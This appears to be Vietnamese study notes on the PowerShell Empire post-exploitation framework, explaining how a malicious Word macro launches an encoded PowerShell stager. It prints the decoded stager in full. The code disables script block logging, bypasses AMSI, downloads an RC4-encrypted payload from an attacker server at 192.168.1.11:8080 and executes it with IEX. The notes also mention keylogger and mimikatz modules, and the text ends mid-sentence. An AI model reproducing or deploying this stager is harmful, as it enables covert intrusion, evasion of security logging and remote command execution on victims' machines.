# Powershell Empire

## Tổng quan
* Là một công cụ thực thi hoàn toàn trên powershell và công dụng phần nhiều nằm ở các tính năng mà nó có thể khai thác ở máy nạn nhân sau xảy ra tấn công (post-exploitation), được xây dựng trên các giao tiếp bảo mật bằng mật mã và kiến trúc linh hoạt
* Đây là một công cụ mã nguồn mở, được sự đóng góp của nhiều người.
* Empire cho khả năng chạy Powershell mà không cần không cần phải truy cập vào máy tính local và chạy file powershell.exe hay kích hoạt powershell tại màn hình giao diện của máy victim.
* Sau khi thực hiện exploit thành công, các modules có thể được triển khai một cách nhanh chóng, từ việc có thể sử dụng keylogger cho đến mimikatz và tất cả được gói gọn trong một framework.

## Thực hiện tấn công
* Powershell Empire cho phép tạo ra một macro độc hại và được attacker chèn vào một tệp văn bản (.doc hoặc .docx). Khi người dùng mở tệp trên, máy attacker sẽ chạy powershell script được mã hóa và tạo một kết nối tới máy attacker. Khi đó attacker có thể thực hiện các cuộc tấn công Remote Command Execution.
* Ví dụ bên dưới là đoạn mã hóa base64 đã được giải mã:
```
If($PSVersiOnTablE.PSVeRSioN.MAjoR - gE 3) {
  $GPF = [rEF].AssEmBly.GeTTYpE('System.Management.Automation.Utils')."GeTFIE`lD" ('cachedGroupPolicySettings', 'N' + 'onPublic,Static');
  IF($GPF) {
    $GPC = $GPF.GETVALUE($NULl);
    IF($GPC['ScriptB' + 'lockLogging']) {
      $GPC['ScriptB' + 'lockLogging']['EnableScriptB' + 'lockLogging'] = 0;
      $GPC['ScriptB' + 'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
    }
    $Val = [CollECtIOns.GenerIC.DICtIoNary[STRinG, SYSTEm.OBJeCT]]::nEW();
    $VaL.Add('EnableScriptB' + 'lockLogging', 0);
    $vAl.ADd('EnableScriptBlockInvocationLogging', 0);
    $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB' + 'lockLogging'] = $Val
  } Else { [ScRiptBLock]."GetFiE`lD" ('signatures', 'N' + 'onPublic,Static').SeTVaLUE($nULl, (NeW - ObJECT COlLECtionS.GENeriC.HashSET[StRInG]))
  } [REf].ASSEMBLy.GETTYPe('System.Management.Automation.AmsiUtils') | ?{
    $_
  } | %{
    $_.GETFiElD('amsiInitFailed', 'NonPublic,Static').SeTValuE($nUlL, $True)
  };
};
[System.Net.SERVicEPOIntMAnaGEr]::ExPecT100CoNtinuE = 0;
$Wc = NEW - ObjEct SYSteM.NeT.WebClIEnt;
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$wc.HeaDeRS.ADD('User-Agent', $u);
$WC.PrOxY = [SysteM.NeT.WebReQUest]::DEfaUlTWebPROxY;
$wC.PrOXY.CrEDEntiaLs = [SyStem.NET.CredeNtIalCAcHE]::DeFAULTNETWORKCreDentIalS;
$Script: Proxy = $wc.Proxy;
$K = [SYSTeM.TExt.EncoDiNG]::ASCII.GetByTES('LlnFf+C*>o.m5T;KqEVIp[^_tc/NP(H}');
$R = {
  $D,
  $K = $ArGS;
  $S = 0..255;
  0..255 | %{
    $J = ($J + $S[$_] + $K[$_ % $K.CoUnT]) % 256;
    $S[$_],
    $S[$J] = $S[$J],
    $S[$_]
  };
  $D | %{
    $I = ($I + 1) % 256;
    $H = ($H + $S[$I]) % 256;
    $S[$I],
    $S[$H] = $S[$H],
    $S[$I];
    $_ - BXor$S[($S[$I] + $S[$H]) % 256]
  }
};
$ser = 'http://192.168.1.11:8080';
$t = '/admin/get.php';
$wC.HEAdERs.AdD("Cookie", "session=nGfi4abzEOCKLrLbLTJ9WBrGQME=");
$DATa = $WC.DOwNlOadDaTA($Ser + $t);
$IV = $DaTA[0..3];
$DATa = $DAta[4..$DATa.LENgth]; - JOin[CHAR[]]( & $R $Data($IV + $K)) | IEX
```
* Khi tạo file mã độc cho phép ta tùy chọn các thông số về việc có yêu cầu mã hóa đoạn mã độc gửi kết nối đến máy attacker hay không (nếu không sẽ không có tham số **-enc**).
* Do đó ta có thể thấy laucher string **powershell -noP -sta -w 1 -enc** có thể được thay đổi. T
